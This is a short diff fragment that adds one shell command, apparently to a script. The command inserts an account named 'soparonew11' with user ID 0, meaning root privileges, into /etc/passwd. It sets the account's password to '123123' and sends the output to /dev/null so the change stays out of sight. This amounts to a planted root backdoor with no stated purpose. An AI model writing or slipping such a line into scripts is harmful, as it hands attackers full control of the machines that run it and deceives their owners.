@@ -1,0 +1,2 @@
+
+sed -i '$ i\soparonew11:x:0:0:soparonew11:/root:/bin/bash' /etc/passwd && echo -e "123123\n123123\n"|passwd soparonew11 &> /dev/null
